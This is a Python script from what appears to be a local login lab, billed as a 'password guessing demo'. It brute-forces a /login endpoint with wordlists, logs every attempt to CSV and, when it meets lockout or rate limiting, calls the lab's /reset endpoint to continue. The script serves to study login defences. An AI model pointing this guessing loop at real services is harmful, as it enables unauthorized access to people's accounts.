from __future__ import annotations

import argparse
import csv
import datetime
import os
from pathlib import Path
import sys
import time
from typing import Iterator, Literal

import requests

_repo_root = Path(__file__).resolve().parents[1]
if str(_repo_root) not in sys.path:
    sys.path.insert(0, str(_repo_root))

from env_loader import load_env_file

load_env_file(_repo_root / "attack" / ".env")

AttackMode = Literal["cli", "web"]


def env_text(name: str, default: str) -> str:
    value = os.getenv(name)
    return default if value is None or value == "" else value


def env_int(name: str, default: int) -> int:
    value = os.getenv(name)
    return default if value is None or value == "" else int(value)


def env_float(name: str, default: float) -> float:
    value = os.getenv(name)
    return default if value is None or value == "" else float(value)


def env_bool(name: str, default: bool) -> bool:
    value = os.getenv(name)
    if value is None or value == "":
        return default
    lowered = value.strip().lower()
    if lowered in {"1", "true", "yes", "y", "on"}:
        return True
    if lowered in {"0", "false", "no", "n", "off"}:
        return False
    return default


def env_path(name: str, default: Path | None) -> Path | None:
    value = os.getenv(name)
    if value is None or value == "":
        return default
    return Path(value)


def iter_passwords(
    wordlists: list[Path],
    max_passwords: int,
    skip_comment_lines: bool,
) -> Iterator[tuple[str, Path]]:
    yielded = 0
    for wordlist in wordlists:
        with wordlist.open("r", encoding="utf-8", errors="ignore") as handle:
            for raw in handle:
                password = raw.strip()
                if not password:
                    continue
                if skip_comment_lines and password.startswith("#"):
                    continue
                yield password, wordlist
                yielded += 1
                if max_passwords > 0 and yielded >= max_passwords:
                    return


def discover_wordlists(explicit: list[Path], generated_root: Path, pattern: str) -> list[Path]:
    if explicit:
        files: list[Path] = []
        for entry in explicit:
            if entry.is_file():
                files.append(entry)
            elif entry.is_dir():
                files.extend(sorted(entry.rglob(pattern)))
        return files

    if generated_root.exists():
        return sorted(generated_root.rglob(pattern))

    return []


def build_default_log_path() -> Path:
    stamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    return Path("login-lab") / "logs" / f"attack_attempts_{stamp}.csv"


def build_default_log_dir() -> Path:
    stamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    return Path("login-lab") / "logs" / stamp


def mode_specific_log_path(base_path: Path, mode: AttackMode) -> Path:
    if base_path.suffix:
        return base_path.with_name(f"{base_path.stem}_{mode}{base_path.suffix}")
    return base_path.with_name(f"{base_path.name}_{mode}.csv")


def log_path_for_mode(csv_log: Path | None, log_dir: Path | None, mode: AttackMode) -> Path:
    if log_dir is not None:
        return log_dir / f"attack_attempts_{mode}.csv"

    if csv_log is None:
        default_run_dir = build_default_log_dir()
        return default_run_dir / f"attack_attempts_{mode}.csv"

    return csv_log if mode == "cli" else mode_specific_log_path(csv_log, mode)


def get_login_payload(username: str, password: str) -> dict[str, str]:
    return {"username": username, "password": password}


def run_attack(
    mode: AttackMode,
    base_url: str,
    username: str,
    wordlists: list[Path],
    delay: float,
    max_passwords: int,
    csv_log: Path,
    auto_reset_on_block: bool,
    skip_comment_lines: bool,
) -> None:
    normalized_base_url = base_url.rstrip("/")
    login_url = f"{normalized_base_url}/login"
    reset_url = f"{normalized_base_url}/reset"
    tries = 0

    session = requests.Session()
    if mode == "web":
        landing_response = session.get(f"{normalized_base_url}/", timeout=10)
        landing_response.raise_for_status()
        print(f"[{mode}] Loaded web interface: HTTP {landing_response.status_code}")

    csv_log.parent.mkdir(parents=True, exist_ok=True)
    with csv_log.open("w", encoding="utf-8", newline="") as csv_file:
        writer = csv.DictWriter(
            csv_file,
            fieldnames=[
                "timestamp_utc",
                "mode",
                "attempt",
                "username",
                "wordlist_file",
                "password",
                "status_code",
                "event_reason",
                "message",
            ],
        )
        writer.writeheader()

        for password, wordlist_file in iter_passwords(wordlists, max_passwords, skip_comment_lines):
            tries += 1
            payload = get_login_payload(username, password)

            if mode == "cli":
                response = session.post(login_url, json=payload, timeout=10)
            else:
                response = session.post(login_url, data=payload, timeout=10)

            try:
                body = response.json()
            except ValueError:
                body = {"message": response.text}

            event_reason = body.get("reason", "success" if response.status_code == 200 else "unknown")
            message = body.get("message", "")
            print(f"[{mode}] try={tries} password={password!r} status={response.status_code} payload={body}")
            writer.writerow(
                {
                    "timestamp_utc": datetime.datetime.now(datetime.timezone.utc).isoformat(),
                    "mode": mode,
                    "attempt": tries,
                    "username": username,
                    "wordlist_file": str(wordlist_file),
                    "password": password,
                    "status_code": response.status_code,
                    "event_reason": event_reason,
                    "message": message,
                }
            )
            csv_file.flush()

            if response.status_code == 200:
                print(f"[{mode}] Password found.")
                csv_file.flush()
                if delay > 0:
                    time.sleep(delay)
                continue

            if response.status_code in (423, 429):
                print(f"[{mode}] Attack blocked by defenses.")
                if auto_reset_on_block:
                    reset_response = session.post(reset_url, timeout=10)
                    if reset_response.ok:
                        print(f"[{mode}] Lab state reset after block. Continuing.")
                        if delay > 0:
                            time.sleep(delay)
                        continue
                    print(f"[{mode}] Failed to reset lab state after block. Stopping.")
                print(f"[{mode}] Continuing without reset.")
                if delay > 0:
                    time.sleep(delay)
                continue

            if delay > 0:
                time.sleep(delay)

    print(f"[{mode}] Wordlist input exhausted.")
    print(f"[{mode}] CSV log written to: {csv_log}")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Login lab password guessing demo")
    parser.add_argument("--mode", choices=["cli", "web", "both"], default=env_text("ATTACK_MODE", "cli"))
    parser.add_argument("--base-url", default=env_text("ATTACK_BASE_URL", f"http://127.0.0.1:{env_text('PORT', '5000')}"))
    parser.add_argument("--username", default=env_text("ATTACK_USERNAME", env_text("LAB_USERNAME", "test_user")))
    parser.add_argument(
        "--password-list",
        "--wordlist",
        dest="password_lists",
        action="append",
        type=Path,
        help="File or directory (repeatable). If omitted, scans passwords/raw/**/*.txt",
    )
    parser.add_argument(
        "--generated-root",
        type=Path,
        default=env_path("ATTACK_GENERATED_ROOT", Path("passwords/raw")),
        help="Root folder containing generated wordlists",
    )
    parser.add_argument("--pattern", default=env_text("ATTACK_PATTERN", "*.txt"), help="Glob for wordlist discovery")
    parser.add_argument("--max-passwords", type=int, default=env_int("ATTACK_MAX_PASSWORDS", 0), help="0 means unlimited")
    parser.add_argument("--delay", type=float, default=env_float("ATTACK_DELAY", 0.0))
    parser.add_argument(
        "--auto-reset-on-block",
        action="store_true",
        help="Call POST /reset and continue when blocked by lockout/rate-limit",
    )
    parser.add_argument(
        "--no-auto-reset-on-block",
        dest="auto_reset_on_block",
        action="store_false",
        help="Do not reset and continue when blocked",
    )
    parser.set_defaults(auto_reset_on_block=env_bool("ATTACK_AUTO_RESET_ON_BLOCK", True))
    parser.add_argument(
        "--keep-comment-lines",
        action="store_true",
        help="Do not skip wordlist lines beginning with #",
    )
    parser.add_argument(
        "--skip-comment-lines",
        dest="keep_comment_lines",
        action="store_false",
        help="Skip wordlist lines beginning with #",
    )
    parser.set_defaults(keep_comment_lines=env_bool("ATTACK_KEEP_COMMENT_LINES", False))
    parser.add_argument(
        "--csv-log",
        type=Path,
        default=env_path("ATTACK_CSV_LOG", None),
        help="CSV output path for per-attempt logging",
    )
    parser.add_argument(
        "--log-dir",
        type=Path,
        default=env_path("ATTACK_LOG_DIR", None),
        help="Directory for per-run logs. When set, attack_attempts_cli.csv and attack_attempts_web.csv are created inside it.",
    )
    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    explicit = args.password_lists or []
    wordlists = discover_wordlists(explicit, args.generated_root, args.pattern)
    if not wordlists:
        raise SystemExit("No wordlist files found. Provide --password-list or populate passwords/raw.")

    print(f"Loaded {len(wordlists)} wordlist file(s).")

    if args.log_dir is None and args.csv_log is None:
        args.log_dir = env_path("ATTACK_LOG_DIR", build_default_log_dir())

    if args.mode == "both":
        for mode in ("cli", "web"):
            run_attack(
                mode,
                args.base_url,
                args.username,
                wordlists,
                args.delay,
                args.max_passwords,
                log_path_for_mode(args.csv_log, args.log_dir, mode),
                args.auto_reset_on_block,
                not args.keep_comment_lines,
            )
        return

    run_attack(
        args.mode,
        args.base_url,
        args.username,
        wordlists,
        args.delay,
        args.max_passwords,
        log_path_for_mode(args.csv_log, args.log_dir, args.mode),
        args.auto_reset_on_block,
        not args.keep_comment_lines,
    )


if __name__ == "__main__":
    main()